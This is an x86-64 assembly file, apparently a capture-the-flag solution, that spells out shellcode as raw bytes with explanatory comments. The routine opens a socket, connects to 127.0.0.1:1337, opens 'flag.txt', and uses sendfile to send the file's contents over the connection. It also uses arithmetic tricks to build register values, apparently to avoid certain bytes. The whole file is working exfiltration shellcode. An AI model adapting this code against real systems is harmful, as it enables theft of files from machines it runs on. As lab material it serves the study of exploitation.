.data

.text
.globl demo2

demo2:

.byte 0xb8, 0x29, 0x00, 0x00, 0x00 #eax -> syscall = 41 //socket
.byte 0xbf, 0xd9, 0xff, 0xff, 0xff #edi -> domain => 2 //AF_INET
.byte 0xbe, 0x03, 0x00, 0x00, 0x00 #esi -> type => 1 //
.byte 0xba, 0x00, 0x00, 0x00, 0x00 #edx -> protocol => 0
.byte 0x01, 0xc7 # add edi, eax
.byte 0x29, 0xfe # sub esi, edi
.byte 0x21, 0xf2 # and edx, esi
.byte 0x0f, 0x05 #socket

.byte 0x48, 0xb8, 0x02, 0x00, 0x05, 0x39, 0x7f, 0x00, 0x00, 0x01 #rax = 127.0.0.1:1337
.byte 0x50 #push rax
.byte 0xb8, 0x2a, 0x00, 0x00, 0x00 # eax -> syscall = 42
.byte 0xba, 0x10, 0x00, 0x00, 0x00 # edx -> address_len = 16
.byte 0xbf, 0x00, 0x00, 0x00, 0x00 # edi -> socket = 0
.byte 0x48, 0x89, 0xe6 # rsi = rsp
.byte 0x0f, 0x05 #connect, return should rax = 0 if connect is successfull

.byte 0xbe, 0x00, 0x00, 0x00, 0x00 # esi -> oflag = 0//unused
.byte 0xbf, 0x08, 0x20, 0x40, 0x00 # edi -> path = &"flag.txt" //address from step 1
.byte 0xba, 0x00, 0x00, 0x00, 0x00 # edx -> offset = 0 //for sendfile
.byte 0x83, 0xc0, 0x02 #eax += 2 -> syscall = 2 //open
.byte 0x0f, 0x05 #open, return should set eax to 1 if successfull

.byte 0x89, 0xc6 #esi = eax -> in_fd = 1
.byte 0xb8, 0x28, 0x00, 0x00, 0x00 #eax -> syscall = 40 //sendfile
.byte 0xbf, 0x00, 0x00, 0x00, 0x00 #edi -> out_fd = 0
.byte 0x41, 0xba, 0x80, 0x00, 0x00, 0x00 # r10d -> count = 128
.byte 0x0f, 0x05 #sendfile
.byte 0x58 # pop rax

ret
